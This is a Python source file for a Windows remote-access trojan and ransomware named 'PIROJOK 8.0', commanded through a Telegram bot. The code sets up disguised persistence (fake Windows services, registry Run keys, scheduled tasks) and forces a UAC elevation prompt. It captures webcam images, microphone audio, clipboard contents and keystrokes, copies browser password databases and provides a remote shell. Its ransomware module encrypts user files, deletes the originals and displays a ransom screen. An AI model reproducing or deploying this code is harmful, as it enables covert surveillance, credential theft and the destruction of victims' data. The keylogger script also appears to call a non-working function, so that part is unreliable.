#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PIROJOK 8.0 - ULTIMATE STEALTH SPY SUITE
Process injection version - NO ICONS, NO FILES!
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image, ImageGrab
import io
import ctypes
import winreg
import tempfile
import uuid
import base64
import random
import shutil
import psutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ========== OPTIONAL IMPORTS ==========
try:
    import cv2
    WEBCAM_AVAILABLE = True
except:
    WEBCAM_AVAILABLE = False

try:
    import sounddevice as sd
    import soundfile as sf
    MIC_AVAILABLE = True
except:
    MIC_AVAILABLE = False

try:
    import win32clipboard
    CLIPBOARD_AVAILABLE = True
except:
    CLIPBOARD_AVAILABLE = False

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class ProcessInjector:
    """Process injection module - NO FILES, NO ICONS"""
    
    def __init__(self, parent):
        self.p = parent
        self.injected = False
        self.host_pid = None
        self.host_name = None
        
    def inject_into_system(self):
        """Inject into system process - requires admin"""
        try:
            if not self.p.admin_mode:
                return "[ERROR] Need admin rights for injection"
            
            # Target processes (avoid critical ones)
            target_processes = ["svchost.exe", "explorer.exe", "RuntimeBroker.exe"]
            target_pid = None
            target_name = None
            
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in target_processes]:
                    target_pid = proc.info['pid']
                    target_name = proc.info['name']
                    break
            
            if not target_pid:
                return "[ERROR] No suitable target process found"
            
            # Create PowerShell script to run in background
            ps_script = os.path.join(tempfile.gettempdir(), "WindowsUpdate.ps1")
            
            # Get the current executable path
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            with open(ps_script, 'w') as f:
                f.write(f'''
# PowerShell script - Windows Update Service
$script = @"
while(1){{
    Start-Sleep -Seconds 30
    # Check if main process is running
    $proc = Get-Process -Name "*Pirojok*" -ErrorAction SilentlyContinue
    if(!$proc){{
        # Restart
        Start-Process "{exe_path}" -WindowStyle Hidden
    }}
}}
"@
$job = Start-Job -ScriptBlock {{ Invoke-Expression $using:script }}
''')
            
            # Run PowerShell hidden
            subprocess.Popen([
                'powershell', '-ExecutionPolicy', 'Bypass', 
                '-WindowStyle', 'Hidden', '-File', ps_script
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            
            self.injected = True
            self.host_pid = target_pid
            self.host_name = target_name
            
            return f"[INJECT] Injected into {target_name} (PID: {target_pid})"
            
        except Exception as e:
            return f"[ERROR] Injection failed: {e}"
    
    def create_system_service(self):
        """Create Windows service (no visible icon)"""
        try:
            if not self.p.admin_mode:
                return "[ERROR] Need admin rights"
            
            if not getattr(sys, 'frozen', False):
                return "[ERROR] Only compiled EXE can create service"
            
            # Copy to system32 with system name
            system32 = os.path.join(os.environ['SystemRoot'], 'System32')
            service_name = "wlms" + str(random.randint(1000, 9999)) + ".dll"
            service_path = os.path.join(system32, service_name)
            
            shutil.copy2(sys.executable, service_path)
            
            # Hide file
            ctypes.windll.kernel32.SetFileAttributesW(service_path, 2)
            
            # Create service
            svc_name = "WindowsMediaService" + str(random.randint(100, 999))
            subprocess.run([
                'sc', 'create', svc_name,
                'binPath=', f'"{service_path}"',
                'start=', 'auto',
                'DisplayName=', 'Windows Media Foundation Service'
            ], capture_output=True)
            
            # Start service
            subprocess.run(['sc', 'start', svc_name], capture_output=True)
            
            self.injected = True
            
            return f"[SERVICE] Created as {svc_name}"
            
        except Exception as e:
            return f"[ERROR] Service creation failed: {e}"
    
    def check_status(self):
        """Check injection status"""
        if self.injected:
            return f"[INJECT] Active in {self.host_name} (PID: {self.host_pid})"
        else:
            return "[INJECT] Not active"


class SpyModule:
    """Spy module - camera, microphone, geolocation, etc."""
    
    def __init__(self, parent):
        self.p = parent
        self.keylogger_active = False
        self.keylog_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
        
    def capture_webcam(self):
        """Take photo from webcam"""
        try:
            if not WEBCAM_AVAILABLE:
                return "[ERROR] OpenCV not installed"
            
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                return "[ERROR] No webcam found"
            
            return_value, image = camera.read()
            camera.release()
            
            if return_value:
                img_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
                cv2.imwrite(img_path, image)
                with open(img_path, 'rb') as f:
                    img_data = f.read()
                os.remove(img_path)
                return img_data
            else:
                return "[ERROR] Failed to capture webcam"
        except Exception as e:
            return f"[ERROR] Webcam error: {e}"
    
    def record_microphone(self, seconds=5):
        """Record sound from microphone"""
        try:
            if not MIC_AVAILABLE:
                return "[ERROR] Sounddevice not installed"
            
            seconds = int(seconds)
            fs = 44100
            
            self.p.send_message(self.p.owner_id, f"[MIC] Recording {seconds} seconds...")
            
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()
            
            audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
            sf.write(audio_path, recording, fs)
            
            with open(audio_path, 'rb') as f:
                audio_data = f.read()
            
            os.remove(audio_path)
            return audio_data
        except Exception as e:
            return f"[ERROR] Microphone error: {e}"
    
    def get_location(self):
        """Get location by IP and Wi-Fi"""
        try:
            result = []
            result.append("[LOCATION] Geolocation data:")
            
            try:
                ip_response = requests.get('http://ip-api.com/json/', timeout=5)
                if ip_response.status_code == 200:
                    data = ip_response.json()
                    result.append(f"IP: {data['query']}")
                    result.append(f"Country: {data['country']}")
                    result.append(f"City: {data['city']}")
                    result.append(f"ISP: {data['isp']}")
                    result.append(f"Coordinates: {data.get('lat', '?')}, {data.get('lon', '?')}")
            except:
                result.append("IP: unknown")
            
            try:
                wifi_result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
                                            capture_output=True, text=True, encoding='cp866')
                if wifi_result.returncode == 0:
                    result.append("\nAvailable Wi-Fi networks:")
                    lines = wifi_result.stdout.split('\n')
                    for line in lines:
                        if 'SSID' in line or 'Signal' in line:
                            result.append(f"   {line.strip()}")
            except:
                pass
            
            return "\n".join(result)
        except Exception as e:
            return f"[ERROR] Location error: {e}"
    
    def steal_passwords(self):
        """Steal saved passwords from browsers"""
        try:
            results = []
            results.append("[PASSWORDS] Browser password databases:")
            
            # Chrome
            chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
            if os.path.exists(chrome_path):
                dest = os.path.join(tempfile.gettempdir(), 'chrome_passwords.db')
                try:
                    os.system('taskkill /f /im chrome.exe >nul 2>&1')
                    time.sleep(1)
                    shutil.copy2(chrome_path, dest)
                    results.append(f"OK Chrome: {dest}")
                except:
                    results.append("FAIL Chrome: failed to copy")
            
            # Firefox
            firefox_profile = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
            if os.path.exists(firefox_profile):
                for profile in os.listdir(firefox_profile):
                    if 'default' in profile.lower():
                        logins_path = os.path.join(firefox_profile, profile, 'logins.json')
                        if os.path.exists(logins_path):
                            dest = os.path.join(tempfile.gettempdir(), 'firefox_logins.json')
                            try:
                                os.system('taskkill /f /im firefox.exe >nul 2>&1')
                                time.sleep(1)
                                shutil.copy2(logins_path, dest)
                                results.append(f"OK Firefox: {dest}")
                            except:
                                results.append("FAIL Firefox: failed to copy")
            
            # Edge
            edge_path = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data')
            if os.path.exists(edge_path):
                dest = os.path.join(tempfile.gettempdir(), 'edge_passwords.db')
                try:
                    os.system('taskkill /f /im msedge.exe >nul 2>&1')
                    time.sleep(1)
                    shutil.copy2(edge_path, dest)
                    results.append(f"OK Edge: {dest}")
                except:
                    results.append("FAIL Edge: failed to copy")
            
            return "\n".join(results)
        except Exception as e:
            return f"[ERROR] Password stealing failed: {e}"
    
    def get_clipboard(self):
        """Get clipboard content"""
        try:
            if not CLIPBOARD_AVAILABLE:
                return "[ERROR] win32clipboard not installed"
            
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData()
                if data:
                    return f"[CLIPBOARD]\n{data[:1000]}"
                else:
                    return "[CLIPBOARD] Empty"
            except:
                return "[CLIPBOARD] Not text data"
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:
            return f"[ERROR] Clipboard error: {e}"
    
    def start_keylogger(self):
        """Start keylogger"""
        try:
            if self.keylogger_active:
                return "[KEYLOG] Already running"
            
            vbs_path = os.path.join(tempfile.gettempdir(), "keylogger.vbs")
            log_path = self.keylog_file
            
            with open(vbs_path, 'w') as f:
                f.write(f'''
Dim WSH, FSO, logFile
Set WSH = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
logFile = "{log_path}"

Dim specialKeys
Set specialKeys = CreateObject("Scripting.Dictionary")
specialKeys.Add 8, "[BACKSPACE]"
specialKeys.Add 9, "[TAB]"
specialKeys.Add 13, "[ENTER]"
specialKeys.Add 16, "[SHIFT]"
specialKeys.Add 17, "[CTRL]"
specialKeys.Add 18, "[ALT]"
specialKeys.Add 20, "[CAPSLOCK]"
specialKeys.Add 27, "[ESC]"
specialKeys.Add 32, " "
specialKeys.Add 33, "[PGUP]"
specialKeys.Add 34, "[PGDN]"
specialKeys.Add 35, "[END]"
specialKeys.Add 36, "[HOME]"
specialKeys.Add 37, "[LEFT]"
specialKeys.Add 38, "[UP]"
specialKeys.Add 39, "[RIGHT]"
specialKeys.Add 40, "[DOWN]"
specialKeys.Add 45, "[INS]"
specialKeys.Add 46, "[DEL]"
specialKeys.Add 91, "[WIN]"
specialKeys.Add 92, "[WIN]"
specialKeys.Add 112, "[F1]"
specialKeys.Add 113, "[F2]"
specialKeys.Add 114, "[F3]"
specialKeys.Add 115, "[F4]"
specialKeys.Add 116, "[F5]"
specialKeys.Add 117, "[F6]"
specialKeys.Add 118, "[F7]"
specialKeys.Add 119, "[F8]"
specialKeys.Add 120, "[F9]"
specialKeys.Add 121, "[F10]"
specialKeys.Add 122, "[F11]"
specialKeys.Add 123, "[F12]"

Do While True
    For i = 8 To 255
        If specialKeys.Exists(i) Then
            key = specialKeys(i)
        Else
            key = Chr(i)
        End If
        
        If WSH.LogEvent(i) Then
            FSO.OpenTextFile(logFile, 8, True).Write key
        End If
    Next
    WScript.Sleep 10
Loop
''')
            
            subprocess.Popen(['wscript', '//B', vbs_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            self.keylogger_active = True
            return f"[KEYLOG] Started (log: {self.keylog_file})"
        except Exception as e:
            return f"[ERROR] Keylogger failed: {e}"
    
    def stop_keylogger(self):
        """Stop keylogger"""
        try:
            os.system('taskkill /f /im wscript.exe /fi "windowtitle eq *keylogger*" >nul 2>&1')
            self.keylogger_active = False
            return "[KEYLOG] Stopped"
        except:
            return "[KEYLOG] Failed to stop"
    
    def get_keylog(self):
        """Get keylog data"""
        try:
            if os.path.exists(self.keylog_file):
                with open(self.keylog_file, 'r', encoding='utf-8', errors='ignore') as f:
                    data = f.read()
                return f"[KEYLOG]\n{data[-1000:]}"
            else:
                return "[KEYLOG] No data yet"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def clear_keylog(self):
        """Clear keylog"""
        try:
            if os.path.exists(self.keylog_file):
                os.remove(self.keylog_file)
            return "[KEYLOG] Cleared"
        except:
            return "[ERROR] Failed to clear"


class FileManager:
    """File management module - upload/download"""
    
    def __init__(self, parent):
        self.p = parent
        self.download_folder = os.path.join(tempfile.gettempdir(), "pirojok_downloads")
        os.makedirs(self.download_folder, exist_ok=True)
    
    def upload_file(self, filepath):
        """Send file from victim to Telegram"""
        try:
            if not os.path.exists(filepath):
                return f"[ERROR] File not found: {filepath}"
            
            file_size = os.path.getsize(filepath)
            if file_size > 50 * 1024 * 1024:
                return "[ERROR] File too large (max 50MB)"
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            url = f"{self.p.base_url}/sendDocument"
            files = {'document': (os.path.basename(filepath), file_data)}
            data = {'chat_id': self.p.owner_id}
            
            response = requests.post(url, files=files, data=data, timeout=60)
            
            if response.status_code == 200:
                return f"[UPLOAD] File sent: {os.path.basename(filepath)} ({file_size} bytes)"
            else:
                return f"[ERROR] Upload failed: {response.status_code}"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def download_file(self, url, filename=None):
        """Download file to victim from Telegram"""
        try:
            if not filename:
                filename = url.split('/')[-1].split('?')[0]
                if not filename:
                    filename = f"download_{int(time.time())}.bin"
            
            save_path = os.path.join(self.download_folder, filename)
            
            self.p.send_message(self.p.owner_id, f"[DOWNLOAD] Downloading {filename}...")
            
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                file_size = os.path.getsize(save_path)
                return f"[DOWNLOAD] Saved: {save_path} ({file_size} bytes)"
            else:
                return f"[ERROR] Download failed: {response.status_code}"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def list_downloads(self):
        """List downloaded files"""
        try:
            files = os.listdir(self.download_folder)
            if not files:
                return "[FILES] No downloaded files"
            
            result = ["[FILES] Downloaded files:"]
            for f in files:
                path = os.path.join(self.download_folder, f)
                size = os.path.getsize(path)
                modified = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
                result.append(f"  {f} ({size} bytes) - {modified}")
            
            return "\n".join(result)
        except Exception as e:
            return f"[ERROR] {e}"


class RemoteShell:
    """Remote shell"""
    
    def __init__(self, parent):
        self.p = parent
        self.history = []
    
    def execute(self, command):
        """Execute command in cmd"""
        try:
            self.history.append(f"> {command}")
            
            process = subprocess.Popen(
                f'cmd /c {command}',
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True,
                encoding='cp866',
                errors='ignore'
            )
            
            stdout, stderr = process.communicate(timeout=30)
            
            result = ""
            if stdout:
                result += f"[OUT]\n{stdout}\n"
            if stderr:
                result += f"[ERR]\n{stderr}\n"
            
            if not result:
                result = "[OK] Command executed (no output)"
            
            self.history.append(result[:200])
            return result[:3500]
            
        except subprocess.TimeoutExpired:
            process.kill()
            return "[ERROR] Command timeout (30s)"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def get_history(self):
        """Show command history"""
        return "\n".join(self.history[-20:])


class PirojokRansomware:
    def __init__(self, parent):
        self.p = parent
        self.encryption_key = None
        self.encrypted_files = []
        self.ransom_note = "README_PIROJOK.txt"
        self.cmd_window = None
        self.active = False
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
            '.mp3', '.mp4', '.avi', '.mov', '.mkv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.db', '.sql', '.mdb', '.accdb',
            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js',
            '.exe', '.dll', '.msi', '.bat', '.cmd'
        ]
        self.exclude_dirs = ['windows', 'winnt', 'program files', 'program files (x86)',
            'boot', 'system32', 'system', '$recycle.bin']
        
    def generate_key(self):
        self.encryption_key = os.urandom(32)
        return base64.b64encode(self.encryption_key).decode()
    
    def show_ransom_window(self):
        """Show fullscreen window with ransom message"""
        try:
            html_path = os.path.join(tempfile.gettempdir(), "pirojok_ransom.html")
            
            html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>PIROJOK RANSOMWARE</title>
    <style>
        body {
            background-color: black;
            color: red;
            font-family: 'Courier New', monospace;
            font-size: 24px;
            text-align: center;
            padding-top: 15%;
            margin: 0;
            overflow: hidden;
        }
        .blink {
            animation: blink 2s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        .warning {
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 50px;
            text-shadow: 0 0 10px red;
        }
        .message {
            font-size: 32px;
            margin: 30px;
            color: #ff4444;
        }
        .danger {
            color: #ff0000;
            font-size: 28px;
            border: 2px solid red;
            padding: 20px;
            margin: 50px;
            background-color: rgba(255,0,0,0.1);
        }
        .footer {
            position: fixed;
            bottom: 20px;
            width: 100%;
            font-size: 18px;
            color: #660000;
        }
    </style>
</head>
<body>
    <div class="warning blink">⚠️ WARNING ⚠️</div>
    <div class="message">YOUR DATA IS ENCRYPTED</div>
    <div class="danger">
        DO NOT TRY TO RESTART YOUR COMPUTER<br>
        OTHERWISE IT WILL DESTROY YOUR DATA
    </div>
    <div class="footer">
        Check Telegram for decryption key | PIROJOK RANSOMWARE
    </div>
    <script>
        window.onbeforeunload = function() {
            return "Do not close this window!";
        };
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' || e.key === 'F11' || (e.altKey && e.key === 'F4')) {
                e.preventDefault();
                return false;
            }
        });
    </script>
</body>
</html>
            """
            
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            os.startfile(html_path)
            
        except Exception as e:
            print(f"Error showing window: {e}")
    
    def encrypt_file(self, filepath):
        try:
            iv = os.urandom(16)
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            with open(filepath, 'rb') as f:
                file_data = f.read()
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            encrypted_path = filepath + '.pirojok'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + encrypted_data)
            os.remove(filepath)
            return encrypted_path
        except: return None
    
    def scan_and_encrypt(self):
        """Scan and encrypt files"""
        if not self.encryption_key:
            self.generate_key()
        
        root_paths = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\OneDrive"),
            os.path.expanduser("~\\AppData\\Local"),
            os.path.expanduser("~\\AppData\\Roaming"),
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\Users\\Public\\Documents",
            "C:\\Users\\Public\\Downloads",
            "C:\\Users\\Public\\Pictures",
            "C:\\Users\\Public\\Videos"
        ]
        
        encrypted = []
        file_count = 0
        max_files = 500
        
        critical_exes = [
            'winlogon.exe', 'lsass.exe', 'services.exe', 'csrss.exe',
            'smss.exe', 'wininit.exe', 'taskmgr.exe', 'explorer.exe',
            'svchost.exe', 'notepad.exe', 'cmd.exe', 'powershell.exe'
        ]
        
        for root_path in root_paths:
            if not os.path.exists(root_path): continue
            for root, dirs, files in os.walk(root_path):
                skip = False
                for exclude in self.exclude_dirs:
                    if exclude in root.lower():
                        skip = True
                        break
                if skip: continue
                
                for file in files:
                    if file_count >= max_files: break
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    
                    if ext == '.exe' and file.lower() in critical_exes:
                        continue
                    
                    if ext in self.target_extensions and not file.endswith('.pirojok'):
                        result = self.encrypt_file(file_path)
                        if result:
                            encrypted.append(file_path)
                            self.encrypted_files.append(result)
                            file_count += 1
                            if file_count % 20 == 0:
                                self.p.send_message(self.p.owner_id, f"[LOCK] Encrypted {file_count} files...")
                if file_count >= max_files: break
            if file_count >= max_files: break
        
        return encrypted
    
    def create_ransom_note(self):
        """Create ransom note on desktop"""
        try:
            desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            if not os.path.exists(desktop):
                desktop = os.path.join(os.environ['PUBLIC'], 'Desktop')
            if not os.path.exists(desktop):
                desktop = tempfile.gettempdir()
                
            note_path = os.path.join(desktop, self.ransom_note)
            key_b64 = base64.b64encode(self.encryption_key).decode()
            
            note = f"""
╔══════════════════════════════════════════════════════════════╗
║                    PIROJOK RANSOMWARE                        ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   Your files have been encrypted!                            ║
║                                                              ║
║   Total encrypted: {len(self.encrypted_files)} files         ║
║                                                              ║
║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
║   Otherwise your data will be destroyed                      ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(note)
            return note_path
        except Exception as e:
            fallback = os.path.join(tempfile.gettempdir(), self.ransom_note)
            with open(fallback, 'w', encoding='utf-8') as f:
                f.write(f"[PIROJOK] Files encrypted. Key: {base64.b64encode(self.encryption_key).decode()}")
            return fallback
    
    def start_ransomware(self):
        """Start ransomware"""
        try:
            self.p.send_message(self.p.owner_id, "[LOCK] Starting ransomware...")
            
            self.generate_key()
            self.show_ransom_window()
            self.p.send_message(self.p.owner_id, "[WINDOW] Ransom window displayed")
            
            encrypted = self.scan_and_encrypt()
            note = self.create_ransom_note()
            os.startfile(note)
            
            self.p.add_all_startup_methods()
            
            key_b64 = base64.b64encode(self.encryption_key).decode()
            self.p.send_message(self.p.owner_id, f"🔐 DECRYPTION KEY:\n{key_b64}")
            
            return f"[OK] Encrypted {len(encrypted)} files\n[KEY] Sent to Telegram"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def decrypt_all(self, key_b64):
        """Decrypt all files"""
        try:
            self.encryption_key = base64.b64decode(key_b64)
            
            pirojok_files = []
            for root, dirs, files in os.walk("C:\\"):
                for file in files:
                    if file.endswith('.pirojok'):
                        pirojok_files.append(os.path.join(root, file))
            
            decrypted = 0
            for file in pirojok_files:
                try:
                    with open(file, 'rb') as f:
                        iv = f.read(16)
                        encrypted_data = f.read()
                    cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
                    original_path = file.replace('.pirojok', '')
                    with open(original_path, 'wb') as f:
                        f.write(decrypted_data)
                    os.remove(file)
                    decrypted += 1
                except: pass
            
            if decrypted > 0:
                self.remove_cmd_message()
                self.p.remove_all_startup()
                return f"[OK] DECRYPTED! {decrypted} files recovered"
            else:
                return "[ERROR] No encrypted files found or invalid key"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def remove_cmd_message(self):
        try:
            os.system('taskkill /f /im cmd.exe /fi "windowtitle eq PIROJOK*" >nul 2>&1')
            os.system('taskkill /f /im msedge.exe /fi "windowtitle eq *PIROJOK*" >nul 2>&1')
            os.system('taskkill /f /im chrome.exe /fi "windowtitle eq *PIROJOK*" >nul 2>&1')
        except: pass


class Pirojok:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "8.0"
        self.command_timeout = 60
        self.admin_mode = False
        self.startup_time = datetime.now()
        self.processing = False
        self.started = False
        self.last_command = ""
        self.last_command_time = datetime.now()
        
        # Флаги
        self.shutdown_flag = os.path.join(tempfile.gettempdir(), "pirojok_shutdown.flag")
        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
        
        # Module initialization
        self.injector = ProcessInjector(self)
        self.ransom = PirojokRansomware(self)
        self.spy = SpyModule(self)
        self.files = FileManager(self)
        self.shell = RemoteShell(self)
        
        # Проверяем права при запуске
        self.admin_mode = self.check_admin()
        print(f"Admin rights: {'YES' if self.admin_mode else 'NO'}")
        
        # Если нет прав - запрашиваем
        if not self.admin_mode:
            self.request_admin()
        
    def check_admin(self):
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except: return False
    
    def request_admin(self):
        """Запрос прав администратора при запуске"""
        try:
            if self.check_admin():
                self.admin_mode = True
                return
            
            if platform.system() != "Windows":
                return
            
            if getattr(sys, 'frozen', False):
                executable = sys.executable
            else:
                executable = sys.executable + ' "' + os.path.abspath(__file__) + '"'
            
            # Запрашиваем права через UAC
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", executable, "", None, 1
            )
            
            if result > 32:
                print("[ADMIN] Requesting admin rights...")
                time.sleep(2)
                sys.exit(0)  # Завершаем текущий процесс, новый запустится с правами
            else:
                print("[ERROR] Failed to get admin rights")
                
        except Exception as e:
            print(f"[ERROR] {e}")
    
    # ========== COMMANDS ==========
    
    def cmd_inject(self):
        """Inject into system process"""
        return self.injector.inject_into_system()
    
    def cmd_service(self):
        """Create hidden service"""
        return self.injector.create_system_service()
    
    def cmd_inject_status(self):
        """Check injection status"""
        return self.injector.check_status()
    
    def cmd_webcam(self):
        result = self.spy.capture_webcam()
        if isinstance(result, bytes):
            self.send_photo(self.owner_id, result, "[WEBCAM] Photo")
            return "[WEBCAM] Photo sent"
        return result
    
    def cmd_mic(self, seconds=5):
        result = self.spy.record_microphone(seconds)
        if isinstance(result, bytes):
            self.send_audio(self.owner_id, result, f"[MIC] {seconds}s recording")
            return f"[MIC] Recording sent ({seconds}s)"
        return result
    
    def cmd_location(self):
        return self.spy.get_location()
    
    def cmd_passwords(self):
        result = self.spy.steal_passwords()
        self.send_message(self.owner_id, result)
        return "[PASSWORDS] Check temp folder"
    
    def cmd_clipboard(self):
        return self.spy.get_clipboard()
    
    def cmd_keylog_start(self):
        return self.spy.start_keylogger()
    
    def cmd_keylog_stop(self):
        return self.spy.stop_keylogger()
    
    def cmd_keylog_get(self):
        return self.spy.get_keylog()
    
    def cmd_keylog_clear(self):
        return self.spy.clear_keylog()
    
    def cmd_upload(self, filepath):
        return self.files.upload_file(filepath)
    
    def cmd_download(self, url, filename=None):
        return self.files.download_file(url, filename)
    
    def cmd_downloads(self):
        return self.files.list_downloads()
    
    def cmd_shell(self, command):
        return self.shell.execute(command)
    
    def cmd_history(self):
        return self.shell.get_history()
    
    def ransomware_start(self):
        if not self.admin_mode:
            return "[ERROR] Need admin rights for ransomware"
        return self.ransom.start_ransomware()
    
    def ransomware_key(self):
        if self.ransom.encryption_key:
            return base64.b64encode(self.ransom.encryption_key).decode()
        return "[ERROR] No key generated"
    
    def ransomware_decrypt(self, key_b64):
        return self.ransom.decrypt_all(key_b64)
    
    def add_all_startup_methods(self):
        results = []
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Registry HKCU
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{exe_path}"')
            results.append("[OK] Registry HKCU")
        except: results.append("[FAIL] Registry HKCU")
        
        # Task scheduler
        try:
            task_name = "WindowsUpdateTask"
            cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                   '/sc', 'onlogon', '/rl', 'highest', '/f']
            subprocess.run(cmd, capture_output=True)
            results.append("[OK] Task scheduler")
        except: results.append("[FAIL] Task scheduler")
        
        return "\n".join(results)
    
    def remove_all_startup(self):
        results = []
        
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "WindowsUpdateSvc")
            results.append("[OK] Removed from registry")
        except:
            results.append("[INFO] Not found in registry")
        
        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True)
        results.append("[OK] Removed from task scheduler")
        
        return "\n".join(results)
    
    def check_startup(self):
        results = ["[STARTUP] Checking locations:"]
        
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as regkey:
                try:
                    winreg.QueryValueEx(regkey, "WindowsUpdateSvc")
                    results.append("[OK] Found in registry")
                except:
                    results.append("[INFO] Not in registry")
        except:
            results.append("[INFO] Could not check registry")
        
        try:
            result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdateTask'], 
                                   capture_output=True, text=True)
            if result.returncode == 0:
                results.append("[OK] Found in task scheduler")
            else:
                results.append("[INFO] Not in task scheduler")
        except:
            results.append("[INFO] Could not check task scheduler")
        
        results.append(self.injector.check_status())
        
        return "\n".join(results)
    
    def send_message(self, chat_id, text):
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_text = f"[{timestamp}] {text}"
            
            url = f"{self.base_url}/sendMessage"
            data = {"chat_id": chat_id, "text": simple_text}
            requests.post(url, data=data, timeout=10)
        except Exception as e:
            print(f"Send error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_caption = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendPhoto"
            files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": chat_id, "caption": simple_caption}
            requests.post(url, files=files, data=data, timeout=30)
        except Exception as e:
            print(f"Photo error: {e}")
    
    def send_audio(self, chat_id, audio_bytes, caption=""):
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_caption = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendAudio"
            files = {"audio": ("recording.wav", audio_bytes, "audio/wav")}
            data = {"chat_id": chat_id, "caption": simple_caption}
            requests.post(url, files=files, data=data, timeout=60)
        except Exception as e:
            print(f"Audio error: {e}")
    
    def get_system_info(self):
        info = []
        info.append(f"[PIROJOK] System Info")
        info.append(f"Version: {self.version}")
        info.append(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
